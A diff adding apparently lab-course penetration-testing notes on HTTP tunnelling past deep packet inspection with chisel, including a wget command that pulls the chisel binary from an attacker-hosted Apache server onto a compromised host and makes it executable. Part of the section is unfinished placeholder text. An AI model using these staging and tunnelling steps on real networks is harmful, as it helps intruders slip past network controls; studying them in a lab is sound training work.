@@ -1640,7 +1640,22 @@ Reference
   - Deleting the port forwarding rule with Netsh
     `C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`  
 
-### 20. Tunneling through deep packet inspectation
+### 20. Tunneling through deep packet inspectation  
+- HTTP Tunneling
+  - Deep Packet Inspection (DPI) terminating all outbound traffic except HTTP  
+  - all inbound ports on CONFLUENCE01 are blocked except TCP/8090  
+  - no reverse shell, no port forward/ Only wget or curl  
+  - [chisel](https://github.com/jpillora/chisel/releases), an HTTP tunneling tool that encapsulates our data stream within HTTP. client/server model. check architecture
+  - copy chisel binary to Apache2 server folder
+    `sudo cp $(which chisel) /var/www/html/`
+  - Starting Apache2 `sudo systemctl start apache2`
+  - download the Chisel binary to /tmp/chisel on CONFLUENCE01 and +x
+    `wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel`
+  - format this to curlswqa-/-
+    ``
+  - ddd
+- DNS Tunneling
+- 
 ### 21. The metassploit framework
 ### 22. Active directory introduction and enumeration
 ### 23. Attacking active drectiory authentication
